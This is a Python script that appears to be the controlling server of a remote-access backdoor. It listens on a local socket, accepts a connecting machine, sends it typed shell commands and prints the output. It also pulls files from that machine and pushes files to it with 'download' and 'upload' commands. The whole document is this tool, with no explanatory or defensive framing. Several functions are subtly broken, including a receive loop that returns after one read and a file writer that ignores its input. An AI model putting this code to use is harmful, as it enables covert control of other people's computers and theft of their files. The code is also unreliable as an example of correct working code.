import subprocess
import socket
import json

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("127.0.0.1", 4367))
s.listen()
print("[+] Server start working, waiting clients... ")
user, address = s.accept()
print(f"[+] Connected avalible with IP = {address}")



def sending_command(command):
	user.send(command.encode('utf-8'))

def taking_output():
	data = user.recv(1024)
	while data:
		return data.decode("cp1252")
		data = user.recv(1024)


def exit_command(command):
	if command == "exit":
		s.close()
		exit()


def write_file(path, data):
	with open(path, mode = 'wb') as file:
		data = user.recv(1024)

		while data:
			file.write(data)
			data = user.recv(1024)

		file.close()


def read_file(path):
	with open(path, mode = 'rb') as file:
		data = file.read(1024)

		while data:
			user.send(data)
			data = file.read(1024)

		file.close()

def run():
	while True:
		command = input(">>> ")
		command_split = command.split(" ")

		if command_split[0] == "download":
			path = command_split[1]
			data = taking_output()
			write_file(path, data)

		if command_split[0] == "upload":
			path = command_split[1]
			read_file(path)

		sending_command(command)

		exit_command(command_split[0])

		command_ressault = taking_output()
		print(command_ressault)

run()